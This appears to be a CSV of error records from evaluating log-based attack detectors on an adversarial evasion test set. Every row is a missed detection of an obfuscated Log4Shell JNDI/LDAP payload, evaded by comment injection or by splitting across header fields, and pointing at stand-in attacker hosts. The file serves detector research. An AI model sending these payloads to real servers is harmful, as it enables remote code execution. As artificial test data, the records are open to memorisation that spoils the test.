model,test_set,id,source,raw_log,normalized_log,true_label,pred_label,score,threshold,error_type,obfuscation_type,explanation
Regex Baseline,adversarial_evasion_test.csv,LS-002563,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002564,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002565,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002566,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} | method: get | host: app.local | path: /search?q=boots,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002567,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},request from user-agent: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002568,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001441,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001442,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001443,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001444,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001445,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001446,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001447,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001448,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001449,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001450,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001451,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001452,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,0,0.0011354894377291203,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001669,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001670,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001671,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001672,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001673,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001674,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001675,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001676,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001677,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001678,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001679,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001680,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,0,0.0012751094764098525,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001897,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001898,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001899,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001900,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001901,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001902,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001903,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001904,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001905,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
Raw BiLSTM,adversarial_evasion_test.csv,LS-001906,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,0,0.0010997792705893517,0.49999999999999994,false_negative_unknown_obfuscation,field_split_payload,Model score disagreed with the dataset label at the evaluation threshold.
